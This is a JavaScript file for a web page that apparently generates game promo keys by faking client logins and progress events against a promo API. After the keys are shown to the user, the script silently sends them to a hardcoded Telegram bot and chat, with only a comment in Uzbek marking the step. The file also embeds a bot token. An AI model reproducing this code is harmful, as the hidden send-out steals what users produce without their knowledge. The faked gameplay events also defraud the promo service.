const APP_TOKEN = "d1690a07-3780-4068-810f-9b5bbf2931b2";
const PROMO_ID = "b4170868-cef0-424f-8eb9-be0622e8e8e3";
const EVENTS_DELAY = 20000;

const TELEGRAM_BOT_TOKEN = "6604200948:AAH5EGBZ8NJvwaVqJXC3jtw2kPI2FnVvUBE";
const CHAT_ID = "1313102282";

document.getElementById("startBtn").addEventListener("click", async () => {
  const startBtn = document.getElementById("startBtn");
  const progressContainer = document.getElementById("progressContainer");
  const progressBar = document.getElementById("progressBar");
  const progressText = document.getElementById("progressText");
  const keyContainer = document.getElementById("keyContainer");
  const generatedKeys = document.getElementById("generatedKeys");
  const keyCount =
    parseInt(document.getElementById("keyCountSelect").value) * 2;

  // Reset UI for new generation
  progressBar.style.width = "0%";
  progressText.innerText = "0%";
  progressContainer.classList.remove("hidden");
  keyContainer.classList.add("hidden");
  generatedKeys.innerText = "";

  startBtn.disabled = true;

  let progress = 0;
  const updateProgress = (increment) => {
    progress += increment;
    progressBar.style.width = `${progress}%`;
    progressText.innerText = `${progress}%`;
  };

  const generateKeyProcess = async () => {
    const clientId = generateClientId();
    let clientToken;
    try {
      clientToken = await login(clientId);
    } catch (error) {
      alert(`Login failed: ${error.message}`);
      startBtn.disabled = false;
      return;
    }

    for (let i = 0; i < 7; i++) {
      await sleep(EVENTS_DELAY * delayRandom());
      const hasCode = await emulateProgress(clientToken);
      updateProgress(10 / keyCount); // Update progress incrementally
      if (hasCode) {
        break;
      }
    }

    try {
      const key = await generateKey(clientToken);
      updateProgress(30 / keyCount); // Finalize progress
      return key;
    } catch (error) {
      alert(`Key generation failed: ${error.message}`);
      return null;
    }
  };

  const keys = await Promise.all(
    Array.from({ length: keyCount }, generateKeyProcess)
  );

  generatedKeys.innerText = keys.filter((key) => key).join("\n");
  keyContainer.classList.remove("hidden");
  // Send generated keys to Telegram
  await sendToTelegram(generatedKeys.innerText);
  startBtn.disabled = false;
});

// Telegramga jonatish

// Function to send message to Telegram
async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
    }),
  });
  const data = await response.json();
  if (!response.ok) {
    throw new Error(data.description || "Failed to send message to Telegram");
  }
}
//

function generateClientId() {
  const timestamp = Date.now();
  const randomNumbers = Array.from({ length: 19 }, () =>
    Math.floor(Math.random() * 10)
  ).join("");
  return `${timestamp}-${randomNumbers}`;
}

async function login(clientId) {
  const response = await fetch("https://api.gamepromo.io/promo/login-client", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      appToken: APP_TOKEN,
      clientId,
      clientOrigin: "deviceid",
    }),
  });
  const data = await response.json();
  if (!response.ok) {
    throw new Error(data.message || "Failed to login");
  }
  return data.clientToken;
}

async function emulateProgress(clientToken) {
  const response = await fetch(
    "https://api.gamepromo.io/promo/register-event",
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${clientToken}`,
      },
      body: JSON.stringify({
        promoId: PROMO_ID,
        eventId: crypto.randomUUID(),
        eventOrigin: "undefined",
      }),
    }
  );
  const data = await response.json();
  if (!response.ok) {
    throw new Error(data.message || "Failed to register event");
  }
  return data.hasCode;
}

async function generateKey(clientToken) {
  const response = await fetch("https://api.gamepromo.io/promo/create-code", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${clientToken}`,
    },
    body: JSON.stringify({ promoId: PROMO_ID }),
  });
  const data = await response.json();
  if (!response.ok) {
    throw new Error(data.message || "Failed to generate key");
  }
  return data.promoCode;
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function delayRandom() {
  return Math.random() / 3 + 1;
}
